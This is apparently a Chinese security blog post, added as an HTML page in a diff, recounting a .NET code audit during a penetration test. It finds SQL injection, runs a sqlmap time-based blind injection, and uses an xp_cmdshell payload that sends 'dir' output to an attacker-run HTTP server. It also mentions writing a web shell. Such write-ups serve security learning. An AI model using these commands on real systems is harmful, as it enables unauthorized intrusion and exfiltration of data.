@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+
+    
+
+    <title>
+      记某次渗透过程中的.NET代码审计 | 拥雪待春色 
+    </title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+      <meta name="author" content="John Doe">
+    
+    
+
+    <meta name="description" content="####0x01 前言  在某次渗透测试过程中遇到了一套C#源码。遂对该源码进行了一些简单的代码审计，发现了一些问题。代码非常简单清楚，非常适合我这种小白审计。于是拿出来写一写。     所使用的一些工具：     ILSPY (用来反编译DLL文件的)     Sublime Text3(让代码阅读起来更方便)     C#在线编译：https://c.runoob.com/compile/14">
+<meta name="keywords" content="代码审计">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记某次渗透过程中的.NET代码审计 | 拥雪待春色">
+<meta property="og:url" content="http://yoursite.com/2018/10/17/audit_net/index.html">
+<meta property="og:site_name" content="拥雪待春色">
+<meta property="og:description" content="####0x01 前言  在某次渗透测试过程中遇到了一套C#源码。遂对该源码进行了一些简单的代码审计，发现了一些问题。代码非常简单清楚，非常适合我这种小白审计。于是拿出来写一写。     所使用的一些工具：     ILSPY (用来反编译DLL文件的)     Sublime Text3(让代码阅读起来更方便)     C#在线编译：https://c.runoob.com/compile/14">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/1574161-ce8455a07f563e9d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/1574161-d6c1ee51690267d2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/1574161-9836aea8bdc55d76.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/1574161-272a50a312ee13d2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/1574161-e67301faaac98866.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/1574161-727c744a93e5f649.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/1574161-4cc7293978a42953.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2018-10-17T03:29:55.472Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="记某次渗透过程中的.NET代码审计 | 拥雪待春色">
+<meta name="twitter:description" content="####0x01 前言  在某次渗透测试过程中遇到了一套C#源码。遂对该源码进行了一些简单的代码审计，发现了一些问题。代码非常简单清楚，非常适合我这种小白审计。于是拿出来写一写。     所使用的一些工具：     ILSPY (用来反编译DLL文件的)     Sublime Text3(让代码阅读起来更方便)     C#在线编译：https://c.runoob.com/compile/14">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/1574161-ce8455a07f563e9d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+    
+    
+    
+      <link rel="icon" type="image/x-icon" href="/favicon.png">
+    
+    <link rel="stylesheet" href="/css/uno.css">
+    <link rel="stylesheet" href="/css/highlight.css">
+    <link rel="stylesheet" href="/css/archive.css">
+    <link rel="stylesheet" href="/css/china-social-icon.css">
+
+</head>
+<body>
+
+    <span class="mobile btn-mobile-menu">
+        <i class="icon icon-list btn-mobile-menu__icon"></i>
+        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+    
+
+<header class="panel-cover panel-cover--collapsed">
+
+
+  <div class="panel-main">
+
+  
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+
+        
+        <a href="/" title="link to homepage for 拥雪待春色"><img src="/images/avatar.png" width="80" alt="拥雪待春色 logo" class="panel-cover__logo logo" /></a>
+        
+
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">拥雪待春色</a></h1>
+        <hr class="panel-cover__divider" />
+
+        
+
+        <div class="navigation-wrapper">
+
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+
+              
+                
+                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">首页</a></li>
+              
+                
+                <li class="navigation__item"><a href="/about" title="" class="">关于</a></li>
+              
+                
+                <li class="navigation__item"><a href="/archive" title="" class="">归档</a></li>
+              
+
+            </ul>
+          </nav>
+
+          <!-- ----------------------------
+To add a new social icon simply duplicate one of the list items from below
+and change the class in the <i> tag to match the desired social network
+and then add your link to the <a>. Here is a full list of social network
+classes that you can use:
+
+    icon-social-500px
+    icon-social-behance
+    icon-social-delicious
+    icon-social-designer-news
+    icon-social-deviant-art
+    icon-social-digg
+    icon-social-dribbble
+    icon-social-facebook
+    icon-social-flickr
+    icon-social-forrst
+    icon-social-foursquare
+    icon-social-github
+    icon-social-google-plus
+    icon-social-hi5
+    icon-social-instagram
+    icon-social-lastfm
+    icon-social-linkedin
+    icon-social-medium
+    icon-social-myspace
+    icon-social-path
+    icon-social-pinterest
+    icon-social-rdio
+    icon-social-reddit
+    icon-social-skype
+    icon-social-spotify
+    icon-social-stack-overflow
+    icon-social-steam
+    icon-social-stumbleupon
+    icon-social-treehouse
+    icon-social-tumblr
+    icon-social-twitter
+    icon-social-vimeo
+    icon-social-xbox
+    icon-social-yelp
+    icon-social-youtube
+    icon-social-zerply
+    icon-mail
+
+-------------------------------->
+
+<!-- add social info here -->
+
+
+
+<nav class="cover-navigation navigation--social">
+  <ul class="navigation">
+
+    
+      <!-- Github -->
+      <li class="navigation__item">
+        <a href="https://github.com/wh0amis" title="Huno on GitHub">
+          <i class='icon icon-social-github'></i>
+          <span class="label">GitHub</span>
+        </a>
+      </li>
+    
+
+    <!-- China social icon -->
+    <!--
+    
+      <li class="navigation__item">
+        <a href="" title="">
+          <i class='icon cs-icon-douban'></i>
+          <span class="label">Douban</span>
+        </a>
+      </li>
+
+      <li class="navigation__item">
+        <a href="" title="">
+          <i class='icon cs-icon-weibo'></i>
+          <span class="label">Weibo</span>
+        </a>
+      </li>
+
+    -->
+
+
+
+  </ul>
+</nav>
+
+
+
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner entry">
+            
+
+<article class="post-container post-container--single">
+
+  <header class="post-header">
+    
+    <h1 class="post-title">记某次渗透过程中的.NET代码审计</h1>
+
+    
+
+    <div class="post-meta">
+      <time datetime="2018-10-17" class="post-meta__date date">2018-10-17</time> 
+
+      <span class="post-meta__tags tags">
+
+          
+
+          
+             &#8226; 标签:
+            <font class="tags">
+              <a class="tags-link" href="/tags/代码审计/">代码审计</a>
+            </font>
+          
+
+      </span>
+    </div>
+    
+    
+
+  </header>
+
+  <section id="post-content" class="article-content post">
+    <p>####0x01 前言<br>  在某次渗透测试过程中遇到了一套C#源码。遂对该源码进行了一些简单的代码审计，发现了一些问题。代码非常简单清楚，非常适合我这种小白审计。于是拿出来写一写。<br>     所使用的一些工具：<br>     ILSPY (用来反编译DLL文件的)<br>     Sublime Text3(让代码阅读起来更方便)<br>     C#在线编译：<a href="https://c.runoob.com/compile/14（在线跑一些DEMO）" target="_blank" rel="noopener">https://c.runoob.com/compile/14（在线跑一些DEMO）</a></p>
+<p>####0x02 代码初览<br>由于代码是从别的地方脱下来的，所以没数据库，只能看代码然后在目标网站测试了。先看看代码结构根据inherits属性找到当前 Web 窗体所继承的代码隐藏类，即bin目录下的App_Web_vr0aluvs.dll文件。<br><img src="https://upload-images.jianshu.io/upload_images/1574161-ce8455a07f563e9d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br><img src="https://upload-images.jianshu.io/upload_images/1574161-d6c1ee51690267d2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>用ILSPY打开，即可找到相关代码。<br><img src="https://upload-images.jianshu.io/upload_images/1574161-9836aea8bdc55d76.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>###0x03 SQL注入<br>两个参数均未过滤，直接拼接进语句。然后入库查询<br><img src="https://upload-images.jianshu.io/upload_images/1574161-272a50a312ee13d2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>但该页面存在鉴权。要求用户登录以后才能进行操作。爆破了一些常见的账号并不行。于是看看其他能直接访问到的页面。<br>在注册代理页面中，如图所示两个SQL语句都直接拼接了相关变量。第二条SQL很明显就可以变量可控。直接注入即可。第一条朔源追查一下相关变量。<br> <img src="https://upload-images.jianshu.io/upload_images/1574161-e67301faaac98866.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>只判断了QID是否为空，QID可控。于是第一条SQL也是可以利用的。<br><img src="https://upload-images.jianshu.io/upload_images/1574161-727c744a93e5f649.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br> 但是两个利用点都无法回显数据，只能利用时间盲注。还有一个问题就是在注入过程中需要对保证每次请求过程中ID参数不一样。如果利用SqlMap跑数据的话可以使用-randomize参数</p>
+<p>######python sqlmap.py -r post.txt –randomize=id –dbs</p>
+<p> 这样就能保证每次请求时ID参数都是不同的。Sqlmap会根据POST数据库包中ID参数值的长度内容进行随机变化。例如ID=100000000, 那么每次就会随机取10000-99999中每个数请求。</p>
+<p>####0x04  盲注命令回显</p>
+<p>  根据代码可知，可以进行多行语句执行。那么我们就可以执行系统命令了。但由于是时间盲注回显结果只能一个字符一个字符的判断，非常慢。有朋友可能会想为什么不直接执行添加用户命令呢。原因很简单，在测试过程中发现SQL被降权了。仅普通用户权限，无法添加用户。所以只要找到Web目录就可以通过echo命令写shell了。但是通过dir命令回显数据也是非常慢。有没有什么更快的方法呢，答案是有的。</p>
+<p>  我第一时间想到的是dnslog。但是dnslog利用起来更复杂。解决问题应该用最优的方法。我们可以在VPS上搭建Http服务器，然后通过for循环执行dir命令，然后通过start命令带上结果进行http请求。然后在vps上查看访问日志即可查看到相关结果。</p>
+<p>  现在VPS上搭建http服务器。一条命令搞定：</p>
+<p> ######python -m SimpleHTTPServer 80</p>
+<p> 然后通过注入在目标机器上执行相关SQL</p>
+<p> ######exec master..xp_cmdshell “for /F %s in (‘dir’) do start <a href="http://1.1.1.1/?%25s" target="_blank" rel="noopener">http://1.1.1.1/?%s</a>“<br>即可收到相关结果<br><img src="https://upload-images.jianshu.io/upload_images/1574161-4cc7293978a42953.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>####0x05 结语<br>在实际的利用过程中，遇到了很多坑。对.NET也不是很熟，都是边看变百度。耐心很重要。后来在数据库里面看到了几个弱口令。心态都崩了。要是多跑几次说不定就出来了。另外文章很多地方都写的不详细。自己记录一下。</p>
+
+  </section>
+
+  <section class="post-comments">
+
+    <!-- 将评论系统（例如Disqus、多说、友言、畅言等）提供的代码片段粘贴在这里 -->
+    
+</section>
+
+
+</article>
+
+
+            <footer class="footer">
+
+    <span class="footer__copyright">&copy; 2014-2015. | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/someus/huno">Huno</a></span>
+    
+</footer>
+        </div>
+    </div>
+
+    <!-- js files -->
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/main.js"></script>
+    <script src="/js/scale.fix.js"></script>
+    
+
+    
+
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+            MathJax.Hub.Config({ 
+                tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
+            });
+        });
+    </script>
+
+
+    
+
+    <script src="/js/awesome-toc.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $.awesome_toc({
+                overlay: true,
+                contentId: "post-content",
+            });
+        });
+    </script>
+
+
+    <script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1273829933'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s22.cnzz.com/stat.php%3Fid%3D1273829933%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script>
+    
+    <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+
+</body>
+</html>
